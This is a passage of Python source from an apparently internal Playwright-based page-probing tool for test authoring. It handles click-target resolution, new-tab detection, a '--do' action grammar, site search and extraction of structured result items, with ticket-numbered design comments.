    `--click "div.trigger-dev-panel"` also works."""
    t = target.strip().lower()
    for c in known:
        if c["name"] == t:
            return c["selector"]
    tn = _norm_name(target)
    if tn:
        for c in known:
            if _norm_name(c["name"]) == tn:
                return c["selector"]
        for c in known:
            cn = _norm_name(c["name"])
            if tn in cn or cn in tn:
                return c["selector"]
    return target


# NOOD_0178 — new tabs. Detection is by page-list GROWTH, never
# page.wait_for_event("popup") after the click: the popup event fires DURING
# the click and a listener registered afterwards resolves on the NEXT one —
# the exact lesson runner._switch_tab carries from NOOD_0177. The step strings
# are verbatim runtime vocabulary (unit-pinned against the pattern table).
_TAB_BLANK_MS = 3000
_TAB_SWITCH_STEPS = ("Then a new tab should open",
                     "When User switches to the new tab")
_TAB_RETURN_STEP = "When User switches to the original tab"
# Same target semantics as runner._switch_tab: new/last = pages[-1], the rest
# = pages[0] (no back-stack past 2 tabs — add when needed, there and here).
_TAB_NEW = ("new", "last")
_TAB_HOME = ("previous", "original", "first", "main")


def _pages(page) -> list:
    """Every page in this browser context — [] when it can't be read."""
    try:
        return list(page.context.pages)
    except Exception:
        return []


def _new_tab(page, before: list, warn: list):
    """The newest page opened since `before` was snapshotted and worth
    collecting, else None. Advisory like the rest of probe: every edge case
    (self-closing popup, tab that never leaves about:blank, several tabs at
    once) is a warning on `warn`, never a raise."""
    fresh = [p for p in _pages(page) if p not in before]
    if not fresh:
        return None
    tab = fresh[-1]
    if len(fresh) > 1:
        warn.append(f"{len(fresh)} new tabs opened at once — probing the "
                    "newest only")
    try:
        if not tab.is_closed():
            tab.wait_for_load_state("domcontentloaded", timeout=_TAB_BLANK_MS)
    except Exception:
        pass
    try:
        if tab.is_closed():
            warn.append("a new tab opened and closed immediately (download "
                        "shim or self-closing popup) — nothing to collect")
            return None
        if tab.url in ("", "about:blank"):
            warn.append(f"a new tab opened but stayed about:blank within "
                        f"{_TAB_BLANK_MS} ms — nothing to collect")
            return None
    except Exception as e:
        warn.append(f"a new tab opened but could not be read: {e}")
        return None
    return tab


def _tab_block(tab, label: str, timeout_ms: int) -> dict:
    """The new tab as its own summarize()-shaped block: navigation-mode settle,
    the same popup sweep the initial load gets, then collect. No diff — a
    different document, so the opener page's selectors mean nothing here."""
    _settle(tab, timeout_ms)              # navigation mode: URL + body + quiet
    closed = _dismiss_popups(tab)
    if closed:
        _settle(tab, min(timeout_ms, 3000))
    blk = summarize(tab.evaluate(_COLLECT_JS), url=tab.url, title=tab.title())
    blk["new_tab"], blk["tab_url"] = True, tab.url
    blk["opened_by"] = blk["revealed_by"] = label
    blk["switch_steps"] = list(_TAB_SWITCH_STEPS)
    if closed:
        blk["popups_closed"] = closed
    perms = _perm_signals(tab)             # per page — the shim is context-wide
    if perms:
        blk["permission_prompts"] = perms
    _verify_unique(tab, blk["controls"])
    return blk


def _reveal(page, pg: dict, clicks: list[str], timeout_ms: int):
    """NOOD_0116 — click each named target in order and append what it
    reveals (controls/headings not present before the click) to
    pg["revealed"], each a summarize()-shaped dict. Targets execute for
    REAL — reveal controls only. Advisory like the rest of probe: a target
    that can't be clicked lands in pg["click_warnings"], the initial
    snapshot stays intact, nothing raises.

    NOOD_0178 — a reveal that opens a new tab gets that tab collected as its
    own block and returns it as the active page, so a --do transaction sharing
    the call continues where the flow actually went."""
    known = list(pg["controls"])
    seen = {c["selector"] for c in known}
    seen_head = set(pg["headings"])
    for target in clicks:
        try:
            sel = _click_selector(known, target)
            ctrl = next((c for c in known if c["selector"] == sel), None)
            loc = page.locator(sel).first
            armed, u, before = _arm(page), page.url, _pages(page)
            # NOOD_0135 — a control the probe already saw as hidden (0-size
            # trigger zone) has no click box: dispatch straight away instead
            # of burning the 3 s actionability wait discovering that.
            if ctrl is not None and ctrl.get("visible") is False:
                loc.dispatch_event("click", timeout=3000)
            else:
                try:
                    loc.click(timeout=3000)
                except Exception:
                    # hidden hitboxes (0-size trigger zones) have no click box
                    loc.dispatch_event("click", timeout=3000)
            settled = _settle(page, timeout_ms, armed=armed, url_before=u)
            tab = _new_tab(page, before, pg.setdefault("warnings", []))
            raw = page.evaluate(_COLLECT_JS)
            raw["controls"] = [c for c in raw["controls"]
                               if _selector(c) not in seen]
            raw["headings"] = [h for h in raw.get("headings", [])
                               if h not in seen_head]
            rev = summarize(raw, url=page.url, title=page.title())
            rev["revealed_by"], rev["settled"] = target, settled
            _verify_unique(page, rev["controls"])
            known += rev["controls"]
            seen |= {c["selector"] for c in rev["controls"]}
            seen_head |= set(rev["headings"])
            # NOOD_0178 — when the click opened a tab, an EMPTY opener-page
            # delta is noise, not evidence: the reveal happened over there.
            if tab is None or rev["controls"] or rev["headings"]:
                pg.setdefault("revealed", []).append(rev)
            if tab is not None:
                blk = _tab_block(tab, target, timeout_ms)
                pg.setdefault("revealed", []).append(blk)
                # Later --click targets land on the tab now, so resolve and
                # diff against IT: a selector string means nothing across
                # documents (same reason _do keeps per-document diff sets).
                page = tab
                known = blk["controls"] + known
                seen = {c["selector"] for c in blk["controls"]}
                seen_head = set(blk["headings"])
        except Exception as e:
            pg.setdefault("click_warnings", []).append(
                f'--click "{target}": {e}')
    return page


# NOOD_0144 — the stateful-transaction grammar. Three verbs cover a
# fill → select → save flow (NOOD_0178 adds a fourth for browser tabs);
# <value> is non-greedy, so "enter a in b in c" reads value=a, field="b in c".
_MAX_DO_LEN = 400   # NOOD_0177 — a --do item is a short sentence; bounds backtracking
# NOOD_0178 — the fourth verb. `\S+` (not `.+?`) for the tab target: one token,
# anchored by "tab", so this alternative adds no backtracking surface.
_DO_RE = re.compile(
    # NOOD_0222 — the row-scoped form first (the generic <btn> would swallow
    # it): a card-grid transaction ("click add to cart in the row containing
    # BBQ Chicken") was the one flow --do rejected, forcing hand-authored
    # features against unprobed state. Executed via the runtime's own
    # click_in_row, so probe and run agree on what a row is.
    r"^\s*(?:clicks?\s+(?P<rbtn>.+?)\s+in\s+(?:the\s+)?row\s+containing\s+(?P<row>.+?)"
    r"|click\s+(?P<btn>.+?)"
    r"|enter\s+(?P<val>.+?)\s+in\s+(?P<field>.+?)"
    r"|select\s+(?P<opt>.+?)\s+from\s+(?P<dd>.+?)"
    r"|switch\s+to\s+(?:the\s+)?(?P<tab>\S+)\s+tab)\s*$", re.I)

# NOOD_0224 — one --do item, a whole chain. Agents write the transaction the
# way they'd say it: "click add to cart in the row containing <item>, click
# proceed to checkout". Every (.+?) above runs to end-of-string, so the row
# caption SWALLOWED ", click proceed to checkout" and the run died on
# "No row containing '<item>, click proceed to checkout' found" — a silent
# misfire that cost a reviewed session eight probes and four leak commands.
# A comma followed by one of the grammar's OWN verbs starts a new action; a
# comma inside a caption ("Large, thin crust") never is, so the split is safe
# without teaching the agent a new syntax. `then`/`and` after the comma are
# connective noise and are eaten with it.
_VERB_SPLIT_RE = re.compile(
    r",\s*(?:then\s+|and\s+)?(?=(?:clicks?|enters?|selects?|switch\s+to)\s)",
    re.I)
# NOOD_0224 — "within" is the preposition agents reach for when they mean the
# row-scoped click, and it failed the same silent way: the generic
# `click <btn>` alternative matched, so "add to cart within <item>" became a
# CONTROL NAME no page has. It means what the grammar spells "in the row
# containing", so read it that way instead of rejecting it.
_WITHIN_RE = re.compile(r"^(clicks?\s+.+?)\s+within\s+(.+)$", re.I)


def _split_do_string(a: str) -> list[str]:
    """One --do item → its ordered actions (NOOD_0224). Unchained items come
    back as a single-element list, so callers need no special case."""
    return [p for p in (s.strip() for s in _VERB_SPLIT_RE.split(a)) if p] or [a]


def parse_do(actions: list[str],
             *, notes: list[str] | None = None,
             ) -> list[tuple[str, str, str | None]]:
    """Parse --do items into (verb, target, value) triples. Raises ValueError
    naming the bad item — callers check BEFORE any browser launches.

    NOOD_0224 — one item may carry a comma-chain of actions; it is split on
    ", <verb>" boundaries first and each part parses on its own. Pass `notes`
    to learn when an item was rewritten that way: the entries are `_do_label`
    strings, so a chained value is never echoed."""
    out = []
    for a in actions:
        # NOOD_0177 — _DO_RE's (.+?) groups straddle two \s+ boundaries and
        # backtrack cubically: 6.64s at 1.6 KB, and this runs BEFORE any browser
        # launches, exactly where the docstring promises the call is cheap.
        a = re.sub(r"\s+", " ", a or "").strip()[:_MAX_DO_LEN]
        parts, start, reworded = _split_do_string(a), len(out), False
        for p in parts:
            p2 = _WITHIN_RE.sub(r"\1 in the row containing \2", p)
            reworded = reworded or p2 != p
            m = _DO_RE.match(p2)
            if not m:
                raise ValueError(
                    f'bad do action {p!r} — use "click <name>", '
                    '"click <name> in the row containing <text>", '
                    '"enter <value> in <field>", "select <option> from <dropdown>" '
                    'or "switch to <new|original> tab"'
                    # NOOD_0224 — name the near miss, not just the grammar: the
                    # reviewed session's next move after a bare form list was a
                    # reworded retry of the same rejected shape.
                    + ('; "within <text>" means "in the row containing <text>"'
                       if re.search(r"\bwithin\b", p, re.I) else ""))
            g = m.groupdict()
            if g["rbtn"] is not None:
                # Quotes are pasted-runtime-phrasing noise; the row text and the
                # control name both resolve against rendered text, not selectors.
                out.append(("click_row", g["rbtn"].strip().strip("'\""),
                            g["row"].strip().strip("'\"")))
            elif g["btn"] is not None:
                out.append(("click", g["btn"].strip(), None))
            elif g["val"] is not None:
                out.append(("enter", g["field"].strip(), g["val"].strip()))
            elif g["opt"] is not None:
                out.append(("select", g["dd"].strip(), g["opt"].strip()))
            else:
                t = g["tab"].lower()
                if t not in (*_TAB_NEW, *_TAB_HOME):
                    # A page tab ("switch to the Settings tab") is a click, not
                    # a browser-tab switch — say so, or the caller retries blind.
                    raise ValueError(
                        f'bad tab target {t!r} in {p!r} — use one of '
                        + "|".join((*_TAB_NEW, *_TAB_HOME))
                        + '; a tab WITHIN the page is "click <name>"')
                out.append(("switch", t, None))
        if notes is not None and (len(parts) > 1 or reworded):
            # Values never enter a note — _do_label is the same value-free
            # labeller the payload uses (NOOD_0144).
            notes.append(
                ("chained --do read as "
                 f"{len(parts)} action(s): " if len(parts) > 1 else
                 '"within" read as "in the row containing": ')
                + " | ".join(_do_label(v, t, x if v == "click_row" else None)
                             for v, t, x in out[start:]))
    return out


def _do_label(verb: str, target: str, row: str | None = None) -> str:
    """The payload label for one action — values are never echoed (NOOD_0144).
    A row caption is page content, not a value, so click_row echoes it: the
    reader needs to know WHICH card the delta came from."""
    if verb == "switch":
        return f"do: switch to {target} tab"
    if verb == "click_row":
        return f"do: click {target} in row containing {row}"
    return f"do: {verb} {target}"


def _do(page, pg: dict, actions: list[tuple], timeout_ms: int):
    """NOOD_0144 — ONE stateful discovery session for a whole transaction:
    execute fill/select/click in the caller's order, settle + diff-snapshot
    after each, so "save → login appears" is discovered in this probe instead
    of one guessed locator per red run. Targets resolve against everything
    probed so far (later actions see what earlier ones revealed). Action
    VALUES are never echoed into the payload — only "do: <verb> <target>"
    labels.

    NOOD_0145 — a failing action HALTS the transaction (prior evidence stays
    intact): the actions after it would run against a state the caller never
    requested, and the reviewed session showed the resulting evidence reads
    as if the flow completed. The failure lands in pg["do_warnings"] plus a
    structured pg["do_failed"] (index, resolved selector, skipped actions);
    pg["do_completed"] counts the actions that DID land. Selects go through
    the runtime's own select implementation (native <select> + custom-
    dropdown fallback), so probe and run time agree on what is selectable.

    NOOD_0178 — the active page follows the flow ACROSS TABS: a click that
    opens one continues there (same "act on the page the flow is ON now" rule
    as a search landing), `switch to <target> tab` moves it deliberately, and
    the page the transaction ended on is returned for --expect."""
    # NOOD_0168 — newest snapshot first: the transaction acts on the page the
    # flow is ON now, so a landed-page control outranks a same-named twin from
    # the start page; what an action just revealed outranks both (prepend).
    known = [c for b in reversed(_blocks(pg)) for c in b["controls"]]
    seen = {c["selector"] for c in known}
    seen_head = {h for b in _blocks(pg) for h in b["headings"]}
    # NOOD_0178 — the diff sets are PER DOCUMENT: the same selector string on
    # two pages is two different controls, so a tab's snapshot must not filter
    # the opener's delta away (the cart badge that changed while we were on the
    # other tab is exactly the evidence a switch-back exists to capture).
    # `known` stays shared on purpose — target resolution is newest-first
    # across tabs, per the NOOD_0168 rule.
    docs = {id(page): (seen, seen_head)}

    def _doc_sets(p, controls=(), headings=()):
        if id(p) not in docs:
            # First time this document is the active one — seed from the blocks
            # already collected FOR IT (matched by url), or a --click-opened tab
            # switching back re-reports the whole initial snapshot as a delta.
            url = getattr(p, "url", None)
            mine = [b for b in _blocks(pg) if b.get("url") == url]
            docs[id(p)] = ({c["selector"] for b in mine for c in b["controls"]},
                           {h for b in mine for h in b["headings"]})
        s, h = docs[id(p)]
        s |= {c["selector"] for c in controls}
        h |= set(headings)
        return s, h

    # NOOD_0214 — how many were ASKED for, beside how many landed. A chain that
    # walked a page transition returns the new page's controls, which read as
    # "the whole flow ran" whether it did or not; the reviewed session rewrote
    # the same --do prose four times to tell those apart. N/M is the answer.
    pg["do_requested"], pg["do_completed"] = len(actions), 0
    for i, (verb, target, value) in enumerate(actions):
        label = _do_label(verb, target,
                          value if verb == "click_row" else None)
        sel = None
        try:
            if verb == "switch":
                pages = _pages(page)
                if len(pages) < 2:
                    pg.setdefault("do_warnings", []).append(
                        f"{label}: only one tab is open — no switch performed")
                else:
                    page = pages[-1] if target in _TAB_NEW else pages[0]
                    seen, seen_head = _doc_sets(page)
                    # The same focus runner._switch_tab applies at run time: a
                    # BACKGROUND tab has its timers throttled, so the delta
                    # that landed while we were away (the cart badge) needs the
                    # tab in front plus a mutation window before it exists to
                    # diff — a bare settle raced it and reported nothing.
                    try:
                        page.bring_to_front()
                    except Exception:
                        pass
                    _settle(page, min(timeout_ms, 3000), armed=_arm(page))
                    pg.setdefault("tab_switches", []).append(target)
                    # The tab we left may have changed while away (a cart
                    # badge, an order count) — diff it like any other delta.
                    rev = _diff_snapshot(page, seen, seen_head)
                    rev["revealed_by"], rev["switched_to"] = label, target
                    if rev["controls"] or rev["headings"]:
                        _verify_unique(page, rev["controls"])
                        known = rev["controls"] + known
                        seen |= {c["selector"] for c in rev["controls"]}
                        seen_head |= set(rev["headings"])
                        pg.setdefault("revealed", []).append(rev)
                pg["do_completed"] = i + 1
                continue
            if verb == "click_row":
                # NOOD_0222 — resolve nothing against `known`: the runtime's
                # click_in_row owns the row-climb (role=row, then the caption's
                # innermost ancestor holding the control), so what the probe
                # proves clickable here is exactly what the authored step does.
                from noodle.agents.web.actions import click_in_row
                sel, ctrl = f'{target} in row containing "{value}"', None
                armed, u, before = _arm(page), page.url, _pages(page)
                click_in_row(page, target, value)
            else:
                sel = _click_selector(known, target)
                ctrl = next((c for c in known if c["selector"] == sel), None)
                loc = page.locator(sel).first
                armed, u, before = _arm(page), page.url, _pages(page)
                if verb == "enter":
                    loc.fill(value)
                elif verb == "select":
                    # NOOD_0145 — the SAME select implementation the runtime
                    # step uses (actions.select_on): native select_option plus
                    # the open-and-click-options fallback for custom
                    # comboboxes. The probe previously supported native
                    # <select> only, so a transaction against a custom
                    # dropdown failed where the authored test would have
                    # passed.
                    from noodle.agents.web.actions import select_on
                    select_on(page, loc, value)
                elif ctrl is not None and ctrl.get("visible") is False:
                    loc.dispatch_event("click", timeout=3000)
                else:
                    try:
                        loc.click(timeout=3000)
                    except Exception:
                        loc.dispatch_event("click", timeout=3000)
            settled = _settle(page, timeout_ms, armed=armed, url_before=u,
                              mutating=(verb == "click" and (
                                  _is_mutating_control(ctrl) if ctrl
                                  else _is_mutating(target)))
                              or (verb == "click_row"
                                  and _is_mutating(target)))
            tab = _new_tab(page, before, pg.setdefault("warnings", []))
            raw = page.evaluate(_COLLECT_JS)
            raw["controls"] = [c for c in raw["controls"]
                               if _selector(c) not in seen]
            raw["headings"] = [h for h in raw.get("headings", [])
                               if h not in seen_head]
            rev = summarize(raw, url=page.url, title=page.title())
            rev["revealed_by"], rev["settled"] = label, settled
            # NOOD_0208 — a `do` block is a state the FLOW walked to, not a
            # panel a reveal-click opened. Authoring must treat the two
            # differently: a revealed control needs an explicit opening click
            # before it is reachable, while this page is reachable precisely
            # because the goal's own actions get there.
            rev["performed"] = True
            if rev["controls"] or rev["headings"] or settled == "navigation":
                _verify_unique(page, rev["controls"])
                known = rev["controls"] + known
                seen |= {c["selector"] for c in rev["controls"]}
                seen_head |= set(rev["headings"])
                pg.setdefault("revealed", []).append(rev)
            elif verb in ("click", "click_row") and tab is None:
                # NOOD_0156 follow-up — a CLICK that changed nothing must
                # still leave a record: silence made "the click did nothing"
                # and "the click worked, UI rendered late" indistinguishable,
                # and the reviewed session burned 4 probes telling them
                # apart. Fills/selects stay silent — a no-delta fill is the
                # normal case, not a signal.
                rev["note"] = ("no new controls or headings appeared within "
                               "the settle window — the click landed but "
                               "produced no observable delta")
                rev["performed"], rev["no_delta"] = True, True
                pg.setdefault("revealed", []).append(rev)
            if tab is not None:
                # NOOD_0178 — the delta is in the tab, not here: collect it and
                # continue the transaction there. Without this the opener page
                # was still being evaluated and the click reported the (false)
                # "no observable delta" note above.
                blk = _tab_block(tab, label, timeout_ms)
                known = blk["controls"] + known
                pg.setdefault("revealed", []).append(blk)
                page = tab
                seen, seen_head = _doc_sets(tab, blk["controls"],
                                            blk["headings"])
            pg["do_completed"] = i + 1
        except Exception as e:
            pg.setdefault("do_warnings", []).append(f"{label}: {e}")
            pg["do_failed"] = {
                "index": i, "action": label, "selector": sel or target,
                "error": str(e),
                "skipped": [_do_label(v, t, x if v == "click_row" else None)
                            for v, t, x in actions[i + 1:]],
            }
            return page
    return page


# Same editable-first spirit as the engine's one-step search: prefer a real
# search box, open a search icon only when the box hides behind one.
# NOOD_0141 — not input-only (Google renders its box as a <textarea>), and
# not English-only: form[role="search"]/type=search/role=searchbox are the
# locale-proof structural signals; the attribute heuristics carry curated
# locale stems (placeholder/aria-label are localized, class/id rarely are).
_SEARCH_STEMS = ("search", "suche", "recherche", "buscar", "búsqueda",
                 "cerca", "ricerca", "zoek", "pesquis")
_SEARCH_BOXES = ('input[type="search"]', '[role="searchbox"]',
                 'form[role="search"] textarea, '
                 'form[role="search"] input:not([type="hidden"])',
                 *(f'input[placeholder*="{s}" i], input[aria-label*="{s}" i], '
                   f'textarea[placeholder*="{s}" i], textarea[aria-label*="{s}" i]'
                   for s in _SEARCH_STEMS),
                 'input[name*="search" i]', 'input[id*="search" i]')
_SEARCH_TRIGGERS = (*(f'[aria-label*="{s}" i]' for s in _SEARCH_STEMS),
                    'button[class*="search" i]', 'a[class*="search" i]',
                    '[class*="search-icon" i]')


def _summary_assertion() -> str:
    """NOOD_0117 — the count assertion to steer authors toward: rendered-card
    counts are lazy-load- and headless-dependent; the page's own summary
    number isn't. NOOD_0125 — a STABLE floor (>= 1), never today's live count:
    baking ">= 45" from the current result set turns a passing test red on the
    next run the moment inventory dips below it, for no real regression — and
    the re-run/fix churn that follows is exactly the AIC we watch. The observed
    count is shown as context in the render; the author raises the floor to
    match intent ("more than 1 item" -> at least 2). Pure — unit-enforced
    against the pattern table."""
    return "the number in 'results summary' should be at least 1"


def _find_search_box(page):
    # NOOD_0169 — never judge a selector by its .first alone: responsive
    # headers render a hidden mobile/desktop twin DOM-earlier than the
    # visible box, and .first-only rejected the whole selector even though
    # a later match was usable. First VISIBLE match wins.
    for sel in _SEARCH_BOXES:
        try:
            loc = page.locator(sel)
            for i in range(min(loc.count(), 6)):
                cand = loc.nth(i)
                if cand.is_visible():
                    return cand
        except Exception:
            continue
    return None


def _search_trigger_candidates(controls: list[dict]) -> list[dict]:
    """NOOD_0166 — probed controls that look like a search OPENER: named with
    a locale search stem, not themselves editable (clicking the hidden box
    can't reveal it). Visible first — a header button beats a 0-size trigger
    zone — and capped so a stem-happy page can't burn the probe's wall clock.
    Pure: the click mechanics stay in _open_search_box."""
    out = [c for c in controls or []
           if c.get("tag") not in ("input", "textarea", "select")
           and any(s in _norm_name(c.get("name")) for s in _SEARCH_STEMS)]
    out.sort(key=lambda c: c.get("visible") is False)
    return out[:3]


def _open_search_box(page, timeout_ms: int, controls: list[dict] | None = None):
    """A VISIBLE search box — clicking a search trigger open first when the box
    hides behind an icon (shared by --search and --suggest, NOOD_0141).

    NOOD_0166 — last resort: the controls this probe already collected. A
    stem-named trigger the CSS heuristics miss (a retail header icon) used to
    cost a whole second probe with --click "search"; clicking it here folds
    that reveal into the one probe. Same hidden-hitbox mechanics as _reveal."""
    box = _find_search_box(page)
    if box is not None:
        return box
    for sel in _SEARCH_TRIGGERS:
        try:
            trig = page.locator(sel).first
            if not trig.count():
                continue
            armed, u = _arm(page), page.url
            trig.click(timeout=3000)
            _settle(page, timeout_ms, armed=armed, url_before=u)
        except Exception:
            continue
        box = _find_search_box(page)
        if box is not None:
            return box
    for c in _search_trigger_candidates(controls or []):
        try:
            loc = page.locator(c["selector"]).first
            armed, u = _arm(page), page.url
            if c.get("visible") is False:
                loc.dispatch_event("click", timeout=3000)
            else:
                try:
                    loc.click(timeout=3000)
                except Exception:
                    loc.dispatch_event("click", timeout=3000)
            _settle(page, timeout_ms, armed=armed, url_before=u)
        except Exception:
            continue
        box = _find_search_box(page)
        if box is not None:
            return box
    return None


def _diff_snapshot(page, seen: set, seen_head: set) -> dict:
    """Fresh collect, minus everything already probed — summarize()-shaped."""
    raw = page.evaluate(_COLLECT_JS)
    raw["controls"] = [c for c in raw["controls"] if _selector(c) not in seen]
    raw["headings"] = [h for h in raw.get("headings", []) if h not in seen_head]
    return summarize(raw, url=page.url, title=page.title())


# NOOD_0156 — structured search-result evidence. A results page renders
# repeated card structures whose class-based selectors collide; the old
# selector-diff + selector-dedup pipeline collapsed 891 real results into
# zero product controls. These pure helpers work on the RAW document-ordered
# collection instead, BEFORE any dedup, and use each link's unique href as
# identity. No vendor selectors, no language assumptions.

_RESULT_ITEMS_CAP = 24
_RESULT_ACTIONS_CAP = 5


def _item_caption(c: dict) -> str:
    """A human result caption: visible link text, descendant image alt,
    title, or accessible name — never machine identity (id/testid/class)."""
    for k in ("text", "alt", "title", "aria", "label"):
        v = (c.get(k) or "").strip()
        if v:
            return v
    return ""


def _nth_scope(selector: str, counts: dict, seen: dict) -> str:
    """A selector that stays unique when the same raw selector repeats across
    cards: Playwright's :nth-match keeps the k-th instance addressable
    instead of deduping every card into one."""
    if counts.get(selector, 0) <= 1:
        return selector
    k = seen[selector] = seen.get(selector, 0) + 1
    return f":nth-match({selector}, {k})"


def build_result_items(raw_controls: list[dict],
                       prev_selectors: set | None = None,
                       prev_names: set | None = None) -> list[dict]:
    """Structured result items from ONE raw document-ordered collection:

      {caption, selector, href?, actions: [{name, selector}]}

    A result item is a captioned link whose STRUCTURE repeats (≥ 2 links
    sharing a class signature with distinct hrefs) — repeated container
    structure with unique descendants, the universal result-card shape.
    Global chrome (logo, cart, sign-in, feedback) doesn't repeat that way and
    is excluded from items while staying in the ordinary control list.
    Buttons between one caption link and the next belong to that card.
    Membership here IS search provenance — a caption never needs to repeat
    the query term. Pure — unit-testable without a browser.

    NOOD_0156 follow-up — a nav/promo strip repeats structurally too (shared
    class, distinct hrefs), so structure alone once bound "pick any result"
    to a header banner. A card group whose members MOSTLY existed on the
    pre-search page (same selector or same caption, via prev_selectors /
    prev_names) is persistent chrome, not results, and is dropped as a
    GROUP — per-item selector diffing stays out (it's what collapsed 891
    real results to zero; see module comment above)."""
    prev = prev_selectors or set()
    prev_caps = {str(n).casefold().strip() for n in (prev_names or set())}
    cands = []
    for idx, c in enumerate(raw_controls or []):
        if c.get("tag") != "a" or not c.get("visible"):
            continue
        if c.get("chrome"):
            continue    # NOOD_0168 — landmark chrome is never a result item
        href = (c.get("href") or "").strip()
        if not href or href.startswith(("javascript:", "mailto:", "tel:", "#")):
            continue
        cap = _item_caption(c)
        if not cap or len(cap) < 3:
            continue
        cands.append((idx, href, cap, c))
    # Repeated-structure inference: group candidate links by class signature;
    # a group is card-shaped when it repeats with distinct hrefs.
    groups: dict[str, set] = {}
    for _, href, _, c in cands:
        groups.setdefault(c.get("cls") or "", set()).add(href)
    card_sigs = {sig for sig, hrefs in groups.items() if len(hrefs) >= 2}
    if card_sigs and (prev or prev_caps):
        def _persisted(k) -> bool:
            _, _, cap, c = k
            return (_selector(c) in prev
                    or cap.casefold().strip() in prev_caps)
        by_sig: dict[str, list] = {}
        for k in cands:
            if (k[3].get("cls") or "") in card_sigs:
                by_sig.setdefault(k[3].get("cls") or "", []).append(k)
        card_sigs = {sig for sig, ks in by_sig.items()
                     if sum(map(_persisted, ks)) * 2 <= len(ks)}
    if card_sigs:
        kept = [k for k in cands if (k[3].get("cls") or "") in card_sigs]
    else:
        # No repeated structure — fall back to the previous-page diff so a
        # short/singleton result list still yields its item.
        kept = [k for k in cands if _selector(k[3]) not in prev]
    href_total: dict[str, int] = {}
    sel_counts: dict[str, int] = {}
    for c in raw_controls or []:
        if c.get("tag") == "a" and (c.get("href") or "").strip():
            h = c["href"].strip()
            href_total[h] = href_total.get(h, 0) + 1
        s = _selector(c)
        sel_counts[s] = sel_counts.get(s, 0) + 1
    items, by_href, sel_seen = [], {}, {}
    starts = []
    for idx, href, cap, c in kept:
        if href in by_href:
            continue                     # image + title link of the SAME card
        if len(items) >= _RESULT_ITEMS_CAP:
            break
        # Unique anchor href beats a repeated class selector; a repeated
        # selector stays addressable per-instance via :nth-match.
        stable = href_total.get(href) == 1
        sel = ('a[href="%s"]' % href.replace('"', '\\"') if stable
               else _nth_scope(_selector(c), sel_counts, sel_seen))
        # NOOD_0169 — extraction provenance: WHY this item qualified, so a
        # bind failure is diagnosable instead of an unexplained empty list.
        why = (["repeated_structure"] if card_sigs else ["post-search-diff"])
        if stable:
            why.append("stable_href")
        item = {"caption": cap, "selector": sel, "href": href,
                "why": why, "actions": []}
        by_href[href] = item
        items.append(item)
        starts.append(idx)
    # Card-scoped actions: buttons between this caption link and the next.
    # ONE page-wide occurrence counter — :nth-match indexes instances across
    # the whole page, so a per-card counter would alias every card's button
    # to the first instance.
    act_seen: dict[str, int] = {}
    for n, item in enumerate(items):
        lo = starts[n]
        hi = starts[n + 1] if n + 1 < len(items) else len(raw_controls or [])
        for c in (raw_controls or [])[lo + 1:hi]:
            if len(item["actions"]) >= _RESULT_ACTIONS_CAP:
                break
            if c.get("tag") == "a" or not c.get("visible"):
                continue
            if _kind(c) != "button":
                continue
            name = _item_caption(c)
            if not name:
                continue
            item["actions"].append(
                {"name": name,
                 "selector": _nth_scope(_selector(c), sel_counts, act_seen)})
    return items


def result_items_warning(summary_count, items,
                         raw_controls: list[dict] | None) -> dict | None:
    """NOOD_0169 — the typed diagnostic for the '1163 results, zero items'
    state: a positive results summary with no extractable structured item is
    an extraction/readiness gap that must surface by category, never as an
    unexplained empty list. Pure — unit-testable without a browser."""
    if items or not isinstance(summary_count, int) or summary_count <= 0:
        return None
    links = [c for c in raw_controls or []
             if c.get("tag") == "a" and c.get("visible")
             and (c.get("href") or "").strip()]
    return {"category": "positive-summary-without-items",
            "summary_count": summary_count,
            "raw_candidate_counts": {
                "visible_links": len(links),
                "captioned_links": sum(1 for c in links if _item_caption(c)),
            }}


def _results_block(page, pg: dict, term: str) -> dict:
    """Snapshot the page a search/suggestion-pick landed on: the new controls
    vs the initial page, structured `result_items` (NOOD_0156), and the
    'NN results' summary element with its ready POM entry + count-floor
    assertion. Shared by --search and --follow (NOOD_0142).

    NOOD_0156 — on a cross-URL landing the FULL page is snapshotted (the old
    selector diff dropped real result controls whose shared retail class
    selectors also existed on the previous page); result items are built from
    the raw document-ordered collection BEFORE any selector dedup."""
    raw = page.evaluate(_COLLECT_JS)
    prev_sel = {c["selector"] for c in pg["controls"]}
    prev_head = set(pg["headings"])
    flat = dict(raw)
    if page.url == pg.get("url"):
        flat["controls"] = [c for c in raw.get("controls", [])
                            if _selector(c) not in prev_sel]
    flat["headings"] = [h for h in raw.get("headings", [])
                        if h not in prev_head]
    res = summarize(flat, url=page.url, title=page.title())
    res["term"] = term
    _verify_unique(page, res["controls"])
    prev_names = {c.get("name", "") for c in pg["controls"]}
    if items := build_result_items(raw.get("controls", []), prev_sel,
                                   prev_names):
        res["result_items"] = items
    info = page.evaluate(_COUNT_JS)
    if info:
        m = _COUNT_RE.search(info["text"])
        n = parse_number(m.group(1)) if m else None
        count = int(n) if n is not None else None
        selector = _selector({**info, "name": "", "aria": "", "title": "",
                              "ph": "", "text": info["text"]})
        res["results_summary"] = {
            "text": info["text"], "selector": selector, "count": count,
            "pom_yaml": f'results summary:\n  css: {_yaml_str(selector)}\n',
            "suggested_assertion": _summary_assertion(),
        }
    warn = result_items_warning(
        (res.get("results_summary") or {}).get("count"),
        res.get("result_items"), raw.get("controls"))
    if warn:
        res["result_items_warning"] = warn
    return res


def _search(page, pg: dict, term: str, timeout_ms: int) -> None:
    """NOOD_0117 — perform the site search and summarize the RESULTS page
    before any test is authored: the ambiguous count element, the exact
    "NN results" summary text, and the new controls all surface up front
    instead of one failed run at a time. Advisory like --click: a page where
    no search box can be found lands in pg["search_warning"], nothing raises."""
    try:
        box = _open_search_box(page, timeout_ms,
                               [c for b in _blocks(pg) for c in b["controls"]])
        if box is None:
            pg["search_warning"] = f'--search "{term}": no search box found'
            return
        box.fill(term)
        box.press("Enter")
        _settle(page, timeout_ms)
        # NOOD_0200 — the initial-load sweep never sees the overlays a
        # promo-heavy site drops on the RESULTS page; an occluded results
        # block costs a whole re-author lap (and a second browser launch).
        # Same sweep + short re-settle _tab_block already does.
        if closed := _dismiss_popups(page):
            pg["popups_closed"] = pg.get("popups_closed", 0) + closed
            _settle(page, min(timeout_ms, 3000))
        # NOOD_0169 — result readiness: a lazy SPA renders the "NN results"
        # summary before any card exists, and a single post-settle snapshot
        # then captured 1163 results with zero items. Poll (bounded by the
        # same timeout) for one of: a structured result item, an explicit
        # zero-results state, or the deadline — re-collecting the raw DOM
        # each lap, never sleeping a fixed duration.
        prev_sel = {c["selector"] for c in pg["controls"]}
